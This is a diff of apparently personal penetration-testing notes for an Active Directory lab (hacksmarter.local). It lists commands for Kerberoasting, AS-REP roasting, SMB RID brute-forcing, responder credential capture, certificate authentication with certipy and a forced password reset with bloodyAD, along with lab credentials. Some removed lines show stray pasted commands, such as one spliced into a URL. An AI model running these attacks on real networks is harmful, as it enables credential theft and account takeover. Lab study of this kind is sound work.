@@ -73,7 +73,8 @@ nxc ldap $target -u 'username' -p '' --asreproast output.txt
 
 If exists dumped or some wordlits of users
 
-```bashpython3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'FuckPass!@' 
+```bash
+python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'FuckPass!@' 
 
 nxc ldap $target -u user.txt -p '' --asreproast output.txt
 ```
@@ -110,15 +111,13 @@ nxc ldap $target -u 'username' -p '' no-preauth-targets kerberoastable.list --ke
 ```
 
 
-More info about https://www.nebloodyAD --host "10.1.107.118" -d 'dc01.hacksmarter.local' -u  'yorinobu' -p  'FuckPass!@' set password 'soulkiller.svc' 'FuckPass!@!@@'
-texec.wiki/ldap-protocol/kerberoasting#kerberoasting[here]
 
 [[SMB]]
 == SMB
 
 Enumerate *groups* , *users* via `smb`
 
-```bashjohn --show hash.john
+```bash
 
 nxc smb $target -u 'username' -p 'password' --rid # also --rid-brute
 ```
@@ -158,9 +157,9 @@ Agaist `tun0` can be anouther,
 Permisions
 ```bash
 sudo responder -I tun0
-```john --show hash.john
+```
 
-john --show hash.john
+
 
 When `responder` started craft `phish-link`
 certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.107.118
@@ -199,7 +198,7 @@ bloodhound-cli
 == Permisions in AD
 
 Perms which can be enumerated by tool `bloodhound`
-john --show hash.john
+
 
 [[generetic]]
 === GenereticAlljohn --show hash.john
